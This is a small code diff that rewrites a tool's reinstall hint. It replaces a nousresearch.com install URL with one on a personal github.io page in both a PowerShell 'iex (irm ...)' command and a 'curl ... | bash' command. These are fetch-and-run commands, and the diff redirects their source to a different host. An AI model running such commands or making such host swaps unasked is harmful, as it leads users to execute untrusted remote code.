@@ -702,8 +702,8 @@ def _perform_uninstall(
 
 
 _REINSTALL_HINT = {
-    True: "  iex (irm https://haishui-agent.nousresearch.com/install.ps1)",
-    False: "  curl -fsSL https://haishui-agent.nousresearch.com/install.sh | bash"}
+    True: "  iex (irm https://aiqinghaiwork163.github.io/haishui-agent/install.ps1)",
+    False: "  curl -fsSL https://aiqinghaiwork163.github.io/haishui-agent/install.sh | bash"}
 # windows -> [(line, color or None)]
 _RELOAD_HINT = {
     True: [("Open a new terminal (PowerShell / Windows Terminal) to pick up", Colors.YELLOW),
